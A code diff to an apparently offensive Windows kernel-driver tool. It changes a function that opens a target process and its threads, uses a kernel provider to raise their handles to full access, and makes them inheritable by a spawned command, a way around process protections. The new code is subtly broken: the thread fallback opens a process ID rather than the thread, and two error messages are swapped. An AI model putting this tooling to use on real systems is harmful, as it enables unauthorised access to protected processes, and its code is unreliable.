@@ -1002,20 +1002,21 @@ BOOL KDURunCommandInheritee(
         printf_s("[+] Opened target process %llu with PROCESS_ALL_ACCESS and got hProc %p\r\n", TargetProcessId, hTargetProc);
     }
 
-    // now check if handle has PROCESS_FULL_ACCESS rights (requesting FULL_ACCESS may still lead to stripped access)
-	if (!KDUSetAccessRights(Context, hTargetProc, PROCESS_ALL_ACCESS)) {
-		printf("[!] Not continuing due to failure in setting handle access rights.\n");
-		return FALSE;
-	}
-
-	// check if handle is inheritable, if not, set it to be inheritable
+    // check if handle is inheritable, if not, set it to be inheritable
     if (!KDUSetHandleInheritable(hTargetProc)) {
         printf("[!] Not continuing due to failure in setting handle inheritance.\n");
         return FALSE;
     }
 
+    // check if handle has PROCESS_FULL_ACCESS rights (requesting FULL_ACCESS may still lead to stripped access)
+	if (!KDUSetAccessRights(Context, hTargetProc, PROCESS_ALL_ACCESS)) {
+		printf("[!] Not continuing due to failure in setting handle access rights.\n");
+		return FALSE;
+	}
+
 	// open all process threads if requested, set them to be inheritable and patch to THREAD_ALL_ACCESS
 	if (OpenThreads) {
+		printf("[+] Opening all threads of target process %llu, set inheritable and THREAD_ALL_ACCESS...\n", TargetProcessId);
 		std::vector<HANDLE> threadHandles;
 
 		HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
@@ -1028,18 +1029,33 @@ BOOL KDURunCommandInheritee(
 		if (Thread32First(hThreadSnap, &te32)) {
 			do {
 				if (te32.th32OwnerProcessID == TargetProcessId) {
-					HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
+					
+                    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
                     if (hThread == NULL) {
+                        
                         // fallback, should work for most
 						hThread = OpenThread(THREAD_QUERY_LIMITED_INFORMATION, FALSE, te32.th32ThreadID);
+
+                        if (hThread == NULL) {
+                            printf_s("[-] Target process %llu cannot be opened via user-mode, fallback to KDUOpenProcess()\r\n", TargetProcessId);
+
+							// 2nd fallback also using KDU OpenProcess
+							if (!KDUVerifyProviderCallbacksForOpenProcess(Context)) { // ignore a thread if the provider does not support arbitrary process handle acquisition
+                                printf_s("[-] Warning: Selected provider does not support arbitrary thread handle acquisition, not inheriting thread %lu.\r\n", te32.th32ThreadID);
+                                continue;
+                            }
+                            if (!KDUOpenProcess(Context, (HANDLE)TargetProcessId, THREAD_ALL_ACCESS, &hThread)) {
+                                printf("[-] Warning: Failed to open thread %lu via user- and kernel-mode, not inheriting it.", te32.th32ThreadID);
+                                continue;
+                            }
+                        }
                     }
 					if (hThread == NULL) {
 						printf("[!] Failed to open thread with TID %lu. Error: %lu\n", te32.th32ThreadID, GetLastError());
 						continue;
 					}
-                    if (KDUSetHandleInheritable(hThread)) {
-						threadHandles.push_back(hThread);
-                    } // else ignore the thread if not inheritable, should not happen, if still rip us
+
+					threadHandles.push_back(hThread);
 				}
 			} while (Thread32Next(hThreadSnap, &te32));
             CloseHandle(hThreadSnap);
@@ -1053,11 +1069,23 @@ BOOL KDURunCommandInheritee(
         // check if the thread handles have THREAD_ALL_ACCESS rights, if not, patch it
         int err = 0;
         for (auto& hThread : threadHandles) {
-            if (!KDUSetAccessRights(Context, hThread, THREAD_ALL_ACCESS)) {
+            if (KDUSetHandleInheritable(hThread)) {
+                if (KDUSetAccessRights(Context, hThread, THREAD_ALL_ACCESS)) {
+					printf("[+] Thread handle %p set to THREAD_ALL_ACCESS and inheritable.\n", hThread);
+				}
+				else {
+					printf("[!] Failed to set thread handle %p as inheritable.\n", hThread);
+					err++;
+				}
+            }
+            else {
+				printf("[!] Failed to set thread handle %p to THREAD_ALL_ACCESS.\n", hThread);
                 err++;
             }
         }
-        printf("[-] Continuing despite not having THREAD_ALL_ACCESS on %i out of %llu thread(s).\n", err, threadHandles.size());
+        if (err > 0) {
+            printf("[-] Continuing despite having %i incomplete threads out of %llu thread(s).\n", err, threadHandles.size());
+        }
 	}
 
     STARTUPINFO si;
